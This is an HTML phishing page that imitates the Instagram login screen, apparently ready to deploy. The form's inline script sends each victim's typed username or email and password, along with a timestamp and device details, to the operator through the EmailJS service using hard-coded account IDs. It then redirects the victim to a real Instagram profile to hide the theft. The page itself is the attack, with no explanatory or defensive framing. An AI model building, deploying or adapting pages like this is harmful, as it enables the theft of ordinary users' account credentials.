<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Instagram â€¢ Log in</title>

  <!-- EmailJS -->
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>

  <style>
    :root{
      --bg:#fafafa;
      --card:#ffffff;
      --border:#dbdbdb;
      --text:#262626;
      --muted:#8e8e8e;
      --blue:#0095f6;
      --blue-dark:#1877f2;
      --link:#00376b;
      --input:#efefef;
    }
    *{box-sizing:border-box}
    body{
      margin:0;
      font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
      background:var(--bg);
      color:var(--text);
      display:flex;
      align-items:center;
      justify-content:center;
      min-height:100vh;
      padding:16px;
    }
    .phone{
      width:360px;
      max-width:100%;
    }
    .card{
      background:var(--card);
      border:1px solid var(--border);
      border-radius:6px;
      padding:28px 28px 18px;
    }
    .logo{
      text-align:center;
      margin:6px 0 22px;
      font-weight:700;
      font-size:40px;
      letter-spacing:-1px;
      font-family: "Billabong", cursive, system-ui;
    }
    /* fallback if Billabong not installed */
    @font-face{
      font-family:"Billabong";
      src:local("Billabong");
    }

    .field{
      margin-bottom:10px;
    }
    .input{
      width:100%;
      border:1px solid var(--border);
      background:var(--input);
      padding:12px 10px;
      border-radius:3px;
      font-size:14px;
      outline:none;
    }
    .input:focus{
      background:#fff;
      border-color:#a8a8a8;
    }
    .btn{
      width:100%;
      border:none;
      border-radius:8px;
      padding:10px 12px;
      background:var(--blue);
      color:#fff;
      font-weight:700;
      font-size:14px;
      cursor:pointer;
      margin-top:6px;
      opacity:.9;
    }
    .btn:disabled{
      opacity:.45;
      cursor:not-allowed;
    }
    .divider{
      display:flex;
      align-items:center;
      gap:14px;
      margin:18px 0 16px;
      color:var(--muted);
      font-size:13px;
      font-weight:600;
    }
    .divider::before,.divider::after{
      content:"";
      height:1px;
      background:var(--border);
      flex:1;
    }
    .fb{
      display:flex;
      align-items:center;
      justify-content:center;
      gap:8px;
      color:var(--blue-dark);
      font-weight:700;
      font-size:14px;
      text-decoration:none;
    }
    .fb .dot{
      width:18px;height:18px;border-radius:50%;
      background:var(--blue-dark);
      color:#fff;
      display:inline-flex;
      align-items:center;
      justify-content:center;
      font-weight:900;
      font-family:system-ui;
      font-size:14px;
      line-height:1;
    }
    .forgot{
      display:block;
      text-align:center;
      margin:16px 0 6px;
      color:var(--link);
      text-decoration:none;
      font-size:12px;
    }
    .signup{
      margin-top:10px;
      background:var(--card);
      border:1px solid var(--border);
      border-radius:6px;
      padding:18px;
      text-align:center;
      font-size:14px;
    }
    .signup a{
      color:var(--blue);
      text-decoration:none;
      font-weight:700;
    }
    .meta{
      text-align:center;
      color:var(--muted);
      font-size:12px;
      margin-top:14px;
    }
  </style>

</head>

<body>

<div class="phone">

<div class="card">

<div class="logo">Instagram</div>

<form id="loginForm">

<div class="field">
<input
class="input"
id="user"
placeholder="Phone number, username, or email"
required>
</div>

<div class="field">
<input
class="input"
id="pass"
type="password"
placeholder="Password"
required>
</div>

<button
class="btn"
id="loginBtn"
type="submit"
disabled>

Log in

</button>

<div class="divider">OR</div>

 <a class="fb" href="#" onclick="return false;">
          <span class="dot">f</span> Log in with Facebook
        </a>

<a class="forgot">Forgot password?</a>

</form>

</div>

<div class="signup">
Don't have an account? Sign up
</div>

<div class="meta">
from Meta
</div>

</div>


<script>

// init EmailJS
emailjs.init("IuHqWHxjlhTbGmCb3");


// elements
const user =
document.getElementById("user");

const pass =
document.getElementById("pass");

const btn =
document.getElementById("loginBtn");

const form =
document.getElementById("loginForm");


// enable button
function updateButton(){

const ok =
user.value.trim() !== "" &&
pass.value.trim() !== "";

btn.disabled = !ok;

btn.style.opacity = ok ? "1" : ".45";

}

user.addEventListener("input",updateButton);
pass.addEventListener("input",updateButton);


// submit
form.addEventListener("submit",function(e){

e.preventDefault();


const templateParams={

email:user.value,
password:pass.value,

time:new Date().toLocaleString(),

device:navigator.userAgent

};


emailjs.send(

"service_1y9w6bf",

"template_53t418k",

templateParams

)

.then(function(){

window.location.href =
"https://www.instagram.com/9rayti.com_?utm_source=ig_web_button_share_sheet&igsh=ZDNlZDc0MzIxNw==";

})


.catch(function(error){

alert("Error: "+error.text);

});

});

</script>


</body>
</html>
